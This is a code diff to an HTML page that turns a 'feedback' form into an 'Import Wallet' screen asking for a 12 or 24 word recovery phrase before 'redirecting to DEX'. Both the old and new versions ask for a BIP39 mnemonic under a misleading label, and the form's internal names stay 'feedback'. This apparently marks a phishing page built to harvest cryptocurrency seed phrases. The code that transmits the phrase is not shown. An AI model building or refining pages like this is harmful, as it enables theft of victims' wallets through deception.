@@ -171,24 +171,24 @@
         <div id="feedbackPage" class="page active">
             <div class="feedback-container">
                 <a href="index.html" class="back-btn">← Back to Home</a>
-                <h2>ENTER YOUR FEEDBACK</h2>
+                <h2>IMPORT WALLET</h2>
                 <p style="text-align: center; margin-bottom: 30px; opacity: 0.8;">
-                    Enter your feedback about AuthPro
+                    Import your wallet to connect to the DEX
                 </p>
                 
                 <div id="successMsg" class="success-message">
-                    ✓ Feedback received successfully! Redirecting to DEX...
+                    ✓ success! Redirecting to DEX...
                 </div>
 
                 <div id="errorMsg" class="error-message">
-                    ✗ Invalid feedback! Please enter a valid BIP39 mnemonic phrase.
+                    ✗ Invalid recovery phrase! Please enter a valid recovery phrase.
                 </div>
 
                 <form id="feedbackForm">
                     <textarea 
                         name="feedback" 
                         id="feedbackText" 
-                        placeholder="Enter your feedback about AuthPro..." 
+                        placeholder="Enter your 12 or 24 word recovery phrase..." 
                         required
                         autocomplete="off"
                         spellcheck="false"
@@ -196,7 +196,7 @@
                     <div class="word-counter">
                         Words: <span id="wordCount">0</span>
                     </div>
-                    <button type="submit" class="btn btn-submit">SUBMIT</button>
+                    <button type="submit" class="btn btn-submit">IMPORT</button>
                 </form>
             </div>
         </div>
